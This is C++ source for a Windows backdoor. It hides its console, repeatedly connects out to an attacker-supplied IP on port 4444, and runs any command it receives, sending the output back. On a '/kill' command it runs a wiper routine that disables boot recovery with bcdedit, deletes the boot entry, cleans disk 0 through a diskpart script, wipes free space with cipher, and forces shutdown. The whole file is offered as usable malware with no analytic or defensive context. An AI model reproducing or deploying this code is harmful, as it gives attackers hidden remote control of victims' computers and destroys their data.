#include <iostream>
#include <string>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 4444
#define SERVER_IP "YOUR_IP"
std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return "error";
    while (fgets(buffer, 128, pipe) != NULL) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

void wipeSystem() {
    system("bcdedit /set {default} recoveryenabled No");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
    system("bcdedit /delete {default} /cleanup");
    system("echo select disk 0 > diskpart.txt");
    system("echo clean >> diskpart.txt");
    system("echo convert mbr >> diskpart.txt");
    system("echo create partition primary >> diskpart.txt");
    system("echo format fs=ntfs quick >> diskpart.txt");
    system("echo assign >> diskpart.txt");
    system("echo exit >> diskpart.txt");
    system("diskpart /s diskpart.txt");
    system("cipher /w:C:");
    system("shutdown /s /f /t 0");
}

void connectToServer() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[4096];
    std::string cmd;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(PORT);
        inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        while (true) {
            memset(buffer, 0, sizeof(buffer));
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) break;

            cmd = std::string(buffer);
            if (cmd == "exit") {
                closesocket(sock);
                WSACleanup();
                return;
            } else if (cmd == "/kill") {
                wipeSystem();
                send(sock, "System wiped\n", 14, 0);
            } else {
                std::string output = exec(cmd.c_str());
                send(sock, output.c_str(), output.size(), 0);
            }
        }
        closesocket(sock);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

int main() {
    FreeConsole();
    connectToServer();
    return 0;
}